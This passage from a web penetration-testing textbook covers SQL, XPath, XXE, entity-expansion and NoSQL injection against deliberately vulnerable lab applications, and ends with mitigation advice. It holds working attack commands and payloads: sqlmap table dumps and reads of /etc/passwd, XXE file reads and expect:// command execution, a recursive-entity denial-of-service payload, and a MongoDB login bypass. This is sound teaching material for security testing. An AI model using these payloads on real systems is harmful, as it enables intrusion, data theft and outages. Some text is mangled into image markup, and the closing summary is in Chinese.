![](img/00152.jpeg)

To extract all the data from certain tables, we use the `--dump` option plus `-D`, to specify the database and `-T`, to specify the table:

```

sqlmap -u http://10.7.7.5/bodgeit/login.jsp --data "username=23&password=23" -D public -T users -dump

```

Let's look at an example of the output:

![](img/00153.jpeg)

The attacker's objective would be to use the SQL injection flaw to gain a further foothold on the server. Using sqlmap, you can read and write files on the database server by exploiting the injection flaw, which invokes the `load_file()` and `out_file()` functions on the target to accomplish it. In the following example, we are reading the contents of the `/etc/passwd` file on the server:

```

sqlmap -u "http://10.7.7.5/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details" -p username --file-read /etc/passwd

```

![](img/00154.jpeg)

A few additional options provided by the `sqlmap` tool are shown in the following table:

| **Option** | **Description** |
| --- | --- |
| `-f` | This performs an extensive fingerprint of the database |
| `-b` | This retrieves the DBMS banner |
| `--sql-shell` | This accesses the SQL shell prompt after successful exploitation |
| `--schema` | This enumerates the database schema |
| `--comments` | This searches for comments in the database |
| `--reg-read` | This reads a Windows registry key value |
| `--identify-waf` | This identifies WAF/IPS protection |
| `--level N` | This sets the scan level (amount and complexity of injected variants) to `N` (1-5) |
| `--risk N` | This sets the risk of requests (1-3); Level 2 includes heavy time-based requests; Level 3 includes OR-based requests |
| `--os-shell` | This attempts to return a system shell |

An extensive list of all of the options that you can use with sqlmap can be found at this GitHub project page, [`github.com/sqlmapproject/sqlmap/wiki/Usage`](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

# Attack potential of the SQL injection flaw

The following are techniques used to manipulate the SQL injection flaw:

*   By altering the SQL query, the attacker can retrieve extra data from the database that a normal user is not authorized to access
*   Run a DoS attack by deleting critical data from the database
*   Bypass authentication and perform privilege escalation attacks
*   Using batched queries, multiple SQL operations can be executed in a single request
*   Advance SQL commands can be used to enumerate the schema of the database and then alter the structure too
*   Use the `load_file()` function to read and write files on the database server and the `into outfile()` function to write files
*   Databases such as Microsoft SQL allow OS commands to run through SQL statements using `xp_cmdshell`; an application vulnerable to SQL injection can allow the attacker to gain complete control over the database server and also attack other devices on the network through it

# XML injection

This section will cover two different perspectives on the use of XML in web applications:

*   When the application performs searches in an XML file or XML database
*   When the user submits XML formatted information to be parsed by the application

# XPath injection

**XPath** is a query language for selecting nodes from an XML document. The following is the basic XML structure:

```

<rootNode>

<childNode>

<element/>

</childNode>

</rootNode>

```

An XPath search for **element** can be represented as follows:

```

/rootNode/childNode/element

```

More complex expressions can be made, for example, an XPath query for a login page may look like the following:

```

//Employee[UserName/text()='myuser' And Password/text()='mypassword']

```

As with SQL, if the input from the user is taken as is and concatenated to a query string, such input may be interpreted as code instead of data parameters.

For example, let's look at bWapp's XML/XPath Injection (Search) exercise. It shows a drop box, where you can choose a genre and search for movies that match this genre:

![](img/00155.jpeg)

Here, `genre` is an input parameter for some search that the application does on the server side. To test it, you will need to create a search while having the browser first identify the request that sends the `genre` parameter to the server (`/bWAPP/xmli_2.php?genre=action&action=search`), and then send it to Repeater. You will do this using a proxy such as Burp Suite or ZAP. Once in Repeater, add a single quote to the genre. Then, click on Go and analyze the response:

![](img/00156.jpeg)

By adding a single quote, we caused a syntax error in the application shown in the response. It clearly indicates that XPath is being used. Now you need to know how the query is constructed. For starters, let's see whether it looks for the whole text or part of it. Remove the last letters of the genre and click on Go:

![](img/00157.jpeg)

You can see that if you use only a part of the genre, you still get the same results as when using the complete word. This means that the query is using the `contains()` function. You can look at the source code in [`github.com/redmondmj/bWAPP`](https://github.com/redmondmj/bWAPP), as it is an open source application. Let's take the black box approach, however; so, it may be something like the following:

```

.../node[contains(genre, '$genre_input')]/node...

```

Though you may not know the full query, you can have a high level of confidence that `[contains(genre, '$genre_input')]` or something very similar is in place.

Now try a more elaborate injection that attempts to retrieve all of the records in the XML file that you inject:

```

')]/*|//*contains('1','1

```

![You can see that the response contains much more information than the original query, and the application will not show some of this information as part of a normal search.# XPath injection with XCat**XCat** is a tool written in Python 3, which can help you retrieve information using XPath injection vulnerabilities. It is not included by default in Kali Linux, but it can easily be added. You need to have Python 3 and pip installed in Kali Linux, and then just run the following in Terminal:```apt-get install python3-pippip3 install xcat```Once XCat is installed, you need to be authenticated in bWAPP to get the vulnerable URL and cookie, so you can issue a command with the following structure:```xcat -m <http_method> -c "<cookie value>" <URL_without_parameters> <injecable_parameter> <parameter1=value> <parameter2=value> -t "<text_in_true_results>"```In this case, the command would be as follows:```xcat -m GET -c "PHPSESSID=kbh3orjn6b2gpimethf0ucq241;JSESSIONID=9D7765D7D1F2A9FCCC5D972A043F9867;security_level=0" http://10.7.7.5/bWAPP/xmli_2.php genre genre=horror action=search -t ">1<"```Notice that we use `">1<"` as the true string. This is because the number in the results table only appear when at least one result is found. Running that command against bWAPP will result in something like the following:![](img/00159.jpeg)

# The XML External Entity injection

In XML, an **entity** is a storage unit that can be internal or external. An internal entity is one that has its value defined in its declaration, and an external entity takes the value from an external resource, such as a file. When an application receives some input from the user in XML format and processes external entities declared within it, it is vulnerable to the **XML External Entity** (**XXE**) injection.

We'll use bWAPP again to put this into practice using the XEE exercise in /A7 - Missing Functional Level Access Control/. There you will see only text with a button, and nothing seems to happen when you click on it. Let's check the proxy's recorded requests, however:

![](img/00160.jpeg)

Thus, here you are sending an XML structure containing your username and some secret. You send the request to Repeater to analyze it further and to test it. First, try to create an internal entity and see if the server processes it. To do this, submit the following XML:

```

<!DOCTYPE test [ <!ENTITY internal-entity "boss" >]>

<reset><login>&internal-entity;</login><secret>Any bugs?</secret></reset>

```

![](img/00161.jpeg)

Here we created an entity called `internal-entity` with the `"boss"` value, and then we used that entity to replace the login value, which was reflected in the response. This means that whatever you load through that entity will be processed and reflected by the server.

Try loading a file as follows:

```

<!DOCTYPE test [  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

```

![](img/00162.jpeg)

Using `SYSTEM`, you are defining an external entity. This loads a file (`/etc/passwd`), and the server displays the result in its response.

If the parser is not properly configured, and the `expect` PHP module is loaded, you can also gain remote execution through XEEs:

```

<!DOCTYPE test [  <!ENTITY xxe SYSTEM "expect://uname -a" >]>

```

# The Entity Expansion attack

Even if external entities are not allowed by the parser, the permitting of internal entities can still be exploited by a malicious user and cause a disruption in the server. As all XML parser replaces entities with their defined values, a set of recursive entities can be created so that the server can process a huge amount of information until it is unable to respond.

This is called an **Entity Expansion attack**. The following structure is a simple proof of concept:

```

<!DOCTYPE test [

<!ENTITY entity0 "Level0-">

<!ENTITY entity1 "Level1-&entity0;">

<!ENTITY entity2 "Level2-&entity1;&entity1;">

<!ENTITY entity3 "Level3-&entity2;&entity2;&entity2;">

<!ENTITY entity4 "Level4-&entity3;&entity3;&entity3;&entity3;">

<!ENTITY entity5 "Level5-&entity4;&entity4;&entity4;&entity4;&entity4;">

]>

<reset><login>&entity0;</login><secret>Any bugs?</secret></reset>

```

![](img/00163.jpeg)

Here, you can see what will happen when `entity5` is loaded. All of the other entities will also be loaded. This information is stored in the server's memory while being processed, so if you send a payload big enough or a recursion deep enough, you may cause the server to run out of memory and be unable to respond to a users' requests.

Now let's see how the response's size changes when loading `entity5`:

![](img/00164.jpeg)

It is important to remember that, when doing penetration testing on real applications, these kinds of tests must be conducted with extreme caution and only up to the point where you can demonstrate that the vulnerability exists without causing disruptions to the service, unless otherwise specified by the client. In this case, a special environment and special logging and monitoring measures should be taken. As for Entity Expansion attacks, demonstrating a recursion of six or seven levels can be enough as a proof of concept. Response times should also be taken into consideration.

# NoSQL injection

In recent years, **Big Data**, or the storage, processing, and analysis of enormous amounts of information in various versions and with various purposes is being increasingly promoted and implemented in companies of different sizes. This kind of information is usually nonstructured or derived from sources that are not necessarily compatible. Thus, it needs to be stored in some special kind of database, the so-called **Not only SQL** (**NoSQL**) databases such as MongoDB, CouchDB, Cassandra, and HBase.

The fact that the aforementioned database managers don't use SQL (or don't use SQL exclusively) doesn't mean that they are free from injection risk. Remember that the SQL injection vulnerability is caused by a lack of validation in the application sending the query, not in the DBMS processing it. The injection of code or altered parameters to queries of NoSQL databases is possible and not uncommon.

# Testing for NoSQL injection

NoSQL queries are usually done in JSON format. For example, a query in MongoDB may look like the following:

```

User.find({ username: req.body.username, password: req.body.password }, ...

```

To inject code in an application using a MongoDB database, you need to take advantage of the JSON syntax using characters such as `' " ; { }` and form valid JSON structures.

# Exploiting NoSQL injection

To test how an actual exploitation works, you can use a vulnerable application made by Snyk ([`github.com/snyk/goof`](https://github.com/snyk/goof)). To run this application, you need to have Node.js and MongoDB installed and properly running in your target server.

You should try an injection attack that bypasses the password check in the admin section. Having a proxy set up, browse to the admin section of your vulnerable application. In this example, it will be `http://10.0.2.2:3001/admin`. If you submit the user `admin` and any password, you can see that no access is given.

![](img/00165.jpeg)

If you send that request to Repeater, you can see that it is sending two parameters: `username` and `password`. You should change the request format to JSON. To do that, you change the value of the `Content-Type` header and the format of the parameters:

![](img/00166.jpeg)

If you submit that request, the server seems to accept it as no errors are generated. So for the sake of clarity, let's use the actual `admin` password in JSON format to be sure that it is actually accepted:

![](img/00167.jpeg)

Now that you know it works, try to inject a condition instead of a password value so that the verification is always true. The query will then say, "If the username is `admin` and the password is greater than an empty string":

```

{"username":"admin","password":{"$gt":""}}

```

`$gt` is a special query operator for MongoDB that represents the greater than (`>`) binary operation. More operators and injection strings can be found at [`github.com/cr0hn/nosqlinjection_wordlists`](https://github.com/cr0hn/nosqlinjection_wordlists).

NoSQLMap ([`github.com/codingo/NoSQLMap.git`](https://github.com/codingo/NoSQLMap.git)) is an open source tool that is not included in Kali Linux, but is easy to install. It can be used to automate NoSQL injection detection and exploitation.

# Mitigation and prevention of injection vulnerabilities

The key aspect of preventing injection vulnerabilities is *validation*. The user-provided input should never be trusted and should always be validated and rejected or sanitized if it contains invalid or dangerous characters such as the following:

*   Quotes (`'` and `"`)
*   Parentheses and brackets
*   Reserved special characters (`'!'`, `'%'`, `'&'`, and `';'`)
*   Comments combinations (`'--'`, `'/*'`, `'*/'`, `'#'`, and `'(:', ':)'`)
*   Other characters specific to language and implementation

The recommended approach for validation is the **whitelist**. This means having a list of allowed characters for each input field or group of fields and comparing the submitted strings to that list. All characters in the submitted string must be in the allowed list for it to be validated.

For SQL injection prevention, parameterized or prepared statements should be used instead of concatenating inputs to query strings. The implementation of prepared statements varies from one language to another, but they all share the same principle; inputs provided by the client are not concatenated to the query string, instead they are sent as parameters to a function that properly builds the query. Here is an example for PHP:

```

$stmt = $dbh->prepare("SELECT * FROM REGISTRY where name LIKE '%?%'");

$stmt->execute(array($_GET['name']));

```

这个主题的一些有用参考资料如下：

+   [`www.owasp.org/index.php/Data_Validation`](https://www.owasp.org/index.php/Data_Validation)

+   [`www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet`](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)

+   [`www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet`](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)

# 概要

在本章中，我们讨论了各种注入漏洞。注入漏洞是 Web 应用程序中的严重漏洞，攻击者可以通过利用它来完全控制服务器。我们还研究了通过不同类型的注入，恶意攻击者可以访问操作系统。然后可以用来攻击网络上的其他服务器。当攻击者利用 SQL 注入漏洞时，他们可以访问后端数据库中的敏感数据。这对组织来说可能是灾难性的。

在下一章中，我们将了解一种特定类型的注入漏洞，即跨站脚本（Cross-Site Scripting），它允许攻击者通过在请求参数中注入或诱使用户注入脚本代码来改变页面向用户呈现的方式。
